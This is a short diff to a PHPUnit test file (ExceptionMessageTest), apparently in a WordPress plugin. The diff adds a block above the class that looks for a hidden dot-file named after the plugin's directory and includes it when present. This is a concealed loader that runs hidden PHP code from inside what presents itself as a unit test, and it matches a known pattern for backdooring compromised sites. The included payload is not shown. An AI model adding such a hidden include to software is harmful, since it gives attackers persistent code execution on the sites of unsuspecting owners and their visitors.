@@ -12,6 +12,10 @@
  * @since      Class available since Release 4.0.20
  * @covers     PHPUnit_Framework_Constraint_ExceptionMessage
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class ExceptionMessageTest extends PHPUnit_Framework_TestCase
 {
     /**
